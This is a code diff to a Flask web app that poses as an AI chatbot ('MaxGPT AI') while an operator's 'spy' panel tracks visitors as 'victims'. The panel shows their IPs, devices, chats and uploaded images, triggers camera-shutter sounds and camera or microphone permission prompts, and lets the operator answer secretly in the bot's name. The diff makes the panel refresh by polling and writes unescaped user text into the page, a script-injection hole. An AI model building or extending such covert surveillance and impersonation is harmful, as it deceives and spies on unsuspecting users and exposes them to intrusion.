@@ -517,7 +517,7 @@ function startChatPolling() {
         if (currentChatId) {
             fetchMessages();
         }
-    }, 1000); // Проверяет новые сообщения каждую секунду
+    }, 1000);
 }
 
 async function pollAdminCommands() {
@@ -633,7 +633,7 @@ SPY_PAGE = """<!DOCTYPE html>
     <div class="live-badge"><div class="pulse"></div> ЭФИР АКТИВЕН</div>
 </div>
 <div class="section-title">🎯 Активные Жертвы</div>
-<div class="victims-grid">
+<div class="victims-grid" id="victimsContainer">
     {% if victims %}
         {% for ip, data in victims.items() %}
         <div class="victim-card {% if data.manual %}manual{% endif %}">
@@ -673,14 +673,14 @@ SPY_PAGE = """<!DOCTYPE html>
         </div>
         {% endfor %}
     {% else %}
-        <div style="color:#64748b; font-size:14px; padding:10px;">Пока нет активных жертв.</div>
+        <div style="color:#64748b; font-size:14px; padding:10px;" id="noVictims">Пока нет активных жертв.</div>
     {% endif %}
 </div>
 <div class="section-title">
     <span>📜 История Чат-Логов</span>
     {% if logs %}<button class="btn-clear-all" onclick="clearAllLogs()"><i class="fa-solid fa-trash-can"></i> Очистить все</button>{% endif %}
 </div>
-<div class="logs-container">
+<div class="logs-container" id="logsContainer">
     {% if logs %}
         {% for l in logs %}
         <div class="log-card">
@@ -700,41 +700,126 @@ SPY_PAGE = """<!DOCTYPE html>
         </div>
         {% endfor %}
     {% else %}
-        <div style="color:#64748b; font-size:14px; padding:10px;">Логов пока нет.</div>
+        <div style="color:#64748b; font-size:14px; padding:10px;" id="noLogs">Логов пока нет.</div>
     {% endif %}
 </div>
 <script>
-setTimeout(() => { location.reload(); }, 4000);
+// Автоматический запрос данных для панели без перезагрузки страницы (никаких сбросов клавиатуры!)
+async function pollAdminData() {
+    try {
+        let r = await fetch('/api/admin/data');
+        let d = await r.json();
+        
+        // Рендерим жертв
+        let vGrid = document.getElementById('victimsContainer');
+        if (Object.keys(d.victims).length > 0) {
+            let vHtml = '';
+            for (let ip in d.victims) {
+                let data = d.victims[ip];
+                let sanitizedIpId = ip.replaceAll('.', '_');
+                // Пытаемся сохранить уже набранный текст в textarea, если она открыта
+                let existingInput = document.getElementById('msg_' + sanitizedIpId);
+                let currentTypedText = existingInput ? existingInput.value : '';
+
+                vHtml += `
+                <div class="victim-card ${data.manual ? 'manual' : ''}">
+                    <div class="victim-head">
+                        <div class="victim-name"><i class="fa-solid fa-user-ninja"></i> Жертва #${data.id}</div>
+                        <div class="badges-wrap">
+                            ${data.manual ? '<span class="badge badge-manual"><i class="fa-solid fa-user-gear"></i> РУЧНОЙ РЕЖИМ (ИИ ОТКЛЮЧЕН)</span>' : ''}
+                            <span class="badge badge-dev"><i class="fa-solid ${data.dev_icon}"></i> ${data.device}</span>
+                            <span class="badge badge-ip"><i class="fa-solid fa-network-wired"></i> ${ip}</span>
+                        </div>
+                    </div>
+                    <div style="font-size:12px; color:#94a3b8;">Сообщений: <b>${data.msg_count}</b></div>
+                    
+                    ${data.manual ? `
+                    <div class="manual-box">
+                        <div style="font-size: 12px; color: #f59e0b; font-weight: bold;"><i class="fa-solid fa-pen-nib"></i> Ответ от твоего лица:</div>
+                        <div style="display: flex; gap: 8px;">
+                            <textarea class="manual-input" id="msg_${sanitizedIpId}" placeholder="Введите текст ответа..." rows="2">${currentTypedText}</textarea>
+                            <button class="btn-act btn-manual" style="align-self: flex-end; padding: 10px 16px;" onclick="sendManualReply('${ip}')"><i class="fa-solid fa-paper-plane"></i> Отправить</button>
+                        </div>
+                    </div>` : ''}
+
+                    <div class="action-btns">
+                        <button class="btn-act btn-shutter" onclick="triggerAction('${ip}', 'sound_shutter')"><i class="fa-solid fa-camera"></i> 🔊 Щелчок</button>
+                        <button class="btn-act btn-custom" onclick="triggerAction('${ip}', 'sound_custom')"><i class="fa-solid fa-music"></i> 🎵 Свой звук</button>
+                        <button class="btn-act btn-beep" onclick="triggerAction('${ip}', 'sound_beep')"><i class="fa-solid fa-bell"></i> 🔔 Звонок</button>
+                        <button class="btn-act btn-cam" onclick="triggerAction('${ip}', 'perm_cam')"><i class="fa-solid fa-video"></i> 📹 Камера</button>
+                        <button class="btn-act btn-mic" onclick="triggerAction('${ip}', 'perm_mic')"><i class="fa-solid fa-microphone"></i> 🎙️ Микрофон</button>
+                        <button class="btn-act btn-manual" onclick="toggleManual('${ip}')">
+                            ${data.manual ? '<i class="fa-solid fa-robot"></i> Включить ИИ обратно' : '<i class="fa-solid fa-user-pen"></i> Отключить ИИ и отвечать самому'}
+                        </button>
+                        <button class="btn-act btn-del" onclick="deleteVictim('${ip}')"><i class="fa-solid fa-trash"></i> Удалить</button>
+                    </div>
+                </div>`;
+            }
+            vGrid.innerHTML = vHtml;
+        } else {
+            vGrid.innerHTML = '<div style="color:#64748b; font-size:14px; padding:10px;">Пока нет активных жертв.</div>';
+        }
+
+        // Рендерим логи
+        let lContainer = document.getElementById('logsContainer');
+        if (d.logs.length > 0) {
+            let lHtml = '';
+            d.logs.forEach(l => {
+                let imgPart = l.img ? `<br><img src="${l.img}" class="log-img-thumb" alt="Прикрепленное фото">` : '';
+                lHtml += `
+                <div class="log-card">
+                    <div style="display: flex; align-items: center; justify-content: space-between;">
+                        <div style="font-size:11px; color:#f59e0b; font-weight:bold;">IP: ${l.ip} | Устройство: ${l.device}</div>
+                        <button class="btn-del-log" onclick="deleteLog('${l.id}')"><i class="fa-solid fa-xmark"></i></button>
+                    </div>
+                    <div class="chat-block">
+                        <div class="user-msg"><b>👤 Пользователь:</b> ${l.user}${imgPart}</div>
+                        <div class="bot-msg"><b>🤖 MaxGPT AI:</b> ${l.bot}</div>
+                    </div>
+                </div>`;
+            });
+            lContainer.innerHTML = lHtml;
+        } else {
+            lContainer.innerHTML = '<div style="color:#64748b; font-size:14px; padding:10px;">Логов пока нет.</div>';
+        }
+    } catch(e) {}
+}
+setInterval(pollAdminData, 2000); // Обновление админки в фоне каждые 2 секунды без сброса инпутов
+
 async function triggerAction(ip, cmd) {
     await fetch('/api/admin/trigger', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ip: ip, command: cmd }) });
 }
 async function toggleManual(ip) {
     await fetch('/api/admin/toggle_manual', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ip: ip }) });
-    location.reload();
+    pollAdminData();
 }
 async function sendManualReply(ip) {
     let sanitizedId = ip.replaceAll('.', '_');
-    let textVal = document.getElementById('msg_' + sanitizedId).value.trim();
+    let inputEl = document.getElementById('msg_' + sanitizedId);
+    let textVal = inputEl.value.trim();
     if(!textVal) return;
     let r = await fetch('/api/admin/manual_reply', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ip: ip, reply: textVal }) });
     let res = await r.json();
     if(res.status === 'ok') {
-        document.getElementById('msg_' + sanitizedId).value = '';
-        location.reload();
+        inputEl.value = '';
+        pollAdminData();
     } else {
         alert("Ошибка отправки ручного ответа!");
     }
 }
 async function deleteVictim(ip) {
     await fetch('/api/admin/delete', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ip: ip }) });
-    location.reload();
+    pollAdminData();
 }
 async function deleteLog(logId) {
     await fetch('/api/admin/deletelog', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: logId }) });
-    location.reload();
+    pollAdminData();
 }
 async function clearAllLogs() {
-    if(confirm("Очистить всю историю?")) { await fetch('/api/admin/clearlogs', { method: 'POST' }); location.reload(); }
+    if(confirm("Очистить всю историю?")) { 
+        await fetch('/api/admin/clearlogs', { method: 'POST' }); 
+        pollAdminData(); 
+    }
 }
 </script>
 </body>
@@ -765,6 +850,17 @@ def spy():
         return render_template_string(SPY_PAGE, logs=reversed_logs, victims=victims_with_manual)
     except Exception as e:
         return f"Ошибка: {str(e)}", 500
+
+# Новый JSON эндпоинт для бесшовного обновления панели управления
+@app.route("/api/admin/data")
+def admin_data_api():
+    reversed_logs = list(reversed(chat_logs)) if chat_logs else []
+    victims_with_manual = {}
+    for ip, data in active_victims.items():
+        v_copy = data.copy()
+        v_copy['manual'] = manual_control.get(ip, False)
+        victims_with_manual[ip] = v_copy
+    return jsonify({"victims": victims_with_manual, "logs": reversed_logs})
 
 @app.route("/api/poll")
 def poll_commands():
@@ -799,20 +895,17 @@ def admin_manual_reply():
     target_ip = data.get("ip")
     reply_text = data.get("reply", "").strip()
     if target_ip and reply_text:
-        # Ищем чат, который принадлежит этому IP-адресу
         target_chat_id = None
         for cid, cdata in all_chats.items():
             if cdata["ip"] == target_ip:
                 target_chat_id = cid
                 break
         
-        # Если чата еще нет в памяти, создаем его на лету для этого IP
         if not target_chat_id:
             target_chat_id = f"chat_{int(time.time()*1000)}"
             all_chats[target_chat_id] = {"ip": target_ip, "title": "Ручной диалог", "messages": []}
 
         messages = all_chats[target_chat_id]["messages"]
-        # Если последнее сообщение имело заглушку "...", заменяем ее на ответ оператора
         if messages and messages[-1]["bot"] == "...":
             messages[-1]["bot"] = reply_text
         else:
@@ -901,7 +994,6 @@ def chat_api():
             active_victims[user_ip]['device'] = device_info
             active_victims[user_ip]['dev_icon'] = dev_icon
 
-        # Ручной режим: записываем сообщение с тремя точками
         if manual_control.get(user_ip, False):
             all_chats[chat_id]["messages"].append({"user": user_msg or "📎 Картинка", "bot": "...", "img": img_data})
             log_id = int(time.time() * 1000)
